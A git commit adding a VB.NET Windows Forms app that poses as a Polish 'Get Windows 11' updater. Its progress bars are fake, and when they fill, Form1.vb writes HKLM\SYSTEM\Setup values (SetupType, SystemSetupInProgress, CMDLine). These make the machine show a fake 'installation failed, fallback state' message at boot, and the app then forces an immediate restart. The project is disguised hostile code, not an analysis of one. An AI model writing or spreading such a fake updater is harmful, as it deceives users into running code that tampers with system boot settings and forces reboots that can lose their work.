b194f59432120b3c351670b367832497bb8e7d46
michalpustelnik7209 <70703680+michalpustelnik7209@users.noreply.github.com>
2021-06-28 16:51:33 +0200

    Add files via upload

---
+++ Form1.Designer.vb
@@ -0,0 +1,154 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar()
+        Me.ProgressBar2 = New System.Windows.Forms.ProgressBar()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.SuspendLayout()
+        '
+        'ProgressBar1
+        '
+        Me.ProgressBar1.Location = New System.Drawing.Point(94, 105)
+        Me.ProgressBar1.Maximum = 9200
+        Me.ProgressBar1.Name = "ProgressBar1"
+        Me.ProgressBar1.Size = New System.Drawing.Size(694, 23)
+        Me.ProgressBar1.TabIndex = 0
+        '
+        'ProgressBar2
+        '
+        Me.ProgressBar2.Location = New System.Drawing.Point(65, 76)
+        Me.ProgressBar2.Maximum = 9200
+        Me.ProgressBar2.Name = "ProgressBar2"
+        Me.ProgressBar2.Size = New System.Drawing.Size(723, 23)
+        Me.ProgressBar2.TabIndex = 1
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Font = New System.Drawing.Font("Microsoft Sans Serif", 15.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(238, Byte))
+        Me.Label1.Location = New System.Drawing.Point(12, 9)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(446, 25)
+        Me.Label1.TabIndex = 2
+        Me.Label1.Text = "Nowy, system Windows 11 jest dostępny!"
+        '
+        'Button1
+        '
+        Me.Button1.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(238, Byte))
+        Me.Button1.Location = New System.Drawing.Point(12, 37)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(776, 36)
+        Me.Button1.TabIndex = 3
+        Me.Button1.Text = "Pobierz aktualizację i zainstaluj"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.Location = New System.Drawing.Point(9, 76)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(50, 13)
+        Me.Label2.TabIndex = 4
+        Me.Label2.Text = "Pobrano:"
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.Location = New System.Drawing.Point(9, 105)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(79, 13)
+        Me.Label3.TabIndex = 5
+        Me.Label3.Text = "Zainstalowano:"
+        '
+        'CheckBox1
+        '
+        Me.CheckBox1.AutoSize = True
+        Me.CheckBox1.Checked = True
+        Me.CheckBox1.CheckState = System.Windows.Forms.CheckState.Checked
+        Me.CheckBox1.Location = New System.Drawing.Point(12, 134)
+        Me.CheckBox1.Name = "CheckBox1"
+        Me.CheckBox1.Size = New System.Drawing.Size(129, 17)
+        Me.CheckBox1.TabIndex = 6
+        Me.CheckBox1.Text = "Restartuj po instalacji."
+        Me.CheckBox1.UseVisualStyleBackColor = True
+        '
+        'Timer1
+        '
+        Me.Timer1.Interval = 5
+        '
+        'Timer2
+        '
+        Me.Timer2.Interval = 2
+        '
+        'TextBox1
+        '
+        Me.TextBox1.Enabled = False
+        Me.TextBox1.Location = New System.Drawing.Point(12, 157)
+        Me.TextBox1.Multiline = True
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.Size = New System.Drawing.Size(776, 367)
+        Me.TextBox1.TabIndex = 7
+        Me.TextBox1.Text = "Aktualizator do Windows 11 - dane"
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(800, 536)
+        Me.Controls.Add(Me.TextBox1)
+        Me.Controls.Add(Me.CheckBox1)
+        Me.Controls.Add(Me.Label3)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.Button1)
+        Me.Controls.Add(Me.Label1)
+        Me.Controls.Add(Me.ProgressBar2)
+        Me.Controls.Add(Me.ProgressBar1)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog
+        Me.MaximizeBox = False
+        Me.Name = "Form1"
+        Me.Text = "Uzyskaj Windows 11"
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents ProgressBar1 As ProgressBar
+    Friend WithEvents ProgressBar2 As ProgressBar
+    Friend WithEvents Label1 As Label
+    Friend WithEvents Button1 As Button
+    Friend WithEvents Label2 As Label
+    Friend WithEvents Label3 As Label
+    Friend WithEvents CheckBox1 As CheckBox
+    Friend WithEvents Timer1 As Timer
+    Friend WithEvents Timer2 As Timer
+    Friend WithEvents TextBox1 As TextBox
+End Class
---
+++ Form1.vb
@@ -0,0 +1,57 @@
+﻿Imports Microsoft.Win32
+
+Public Class Form1
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        Timer1.Start()
+        TextBox1.Text = +"
+
+Pobieranie aktualizacji..."
+    End Sub
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        ProgressBar1.Value = +5
+        If ProgressBar1.Value = ProgressBar1.Maximum Then
+            Timer1.Stop()
+            TextBox1.Text = +"
+
+Gotowe.
+Instalowanie aktualizacji..."
+            Timer2.Start()
+        End If
+    End Sub
+
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        ProgressBar2.Value = +1
+        If ProgressBar2.Value = ProgressBar2.Maximum Then
+            Timer2.Stop()
+            TextBox1.Text = +"
+
+Gotowe."
+            Dim key As RegistryKey = Registry.LocalMachine
+            Dim subkey As RegistryKey
+
+
+            subkey = key.OpenSubKey("SYSTEM\Setup", True)
+
+            subkey.SetValue("OOBEInProgress", 1)
+            subkey.SetValue("SystemSetupInProgress", 1)
+            subkey.SetValue("SetupType", 2)
+            subkey.SetValue("CMDLine", "C:\Windows\System32\cmd.exe /c msg * Instalacja zakończona niepowodzeniem. System będzie w stanie fallback.&REG ADD HKLM\System\Setup /v CmdLine /t Reg_Sz /d "" /f")
+            If CheckBox1.Checked = True Then
+                Dim P As New Process
+                TextBox1.Text = +"
+
+Restartowanie..."
+                Dim s As New ProcessStartInfo("shutdown", " -r -t 0 -f")
+                s.UseShellExecute = False
+                s.CreateNoWindow = True
+                s.RedirectStandardOutput = True
+                s.RedirectStandardError = True
+                P = New Process
+                P.StartInfo = s
+                P.Start()
+                P.EnableRaisingEvents = True
+            End If
+        End If
+    End Sub
+End Class
